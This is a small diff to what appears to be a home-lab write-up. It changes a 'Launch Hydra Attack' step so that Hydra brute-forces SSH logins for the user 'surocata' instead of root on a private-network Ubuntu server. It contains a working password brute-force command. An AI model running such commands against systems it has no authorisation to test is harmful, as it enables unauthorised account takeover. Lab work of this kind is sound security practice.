@@ -129,7 +129,7 @@ Happiest@3104
 ## Step 4 — Launch Hydra Attack
 
 ```bash
-hydra -l root -P passwords.txt ssh://192.168.68.131
+hydra -l surocata -P passwords.txt -t 4 ssh://192.168.68.131
 ```
 
 Hydra attempted multiple SSH logins against the Ubuntu server.
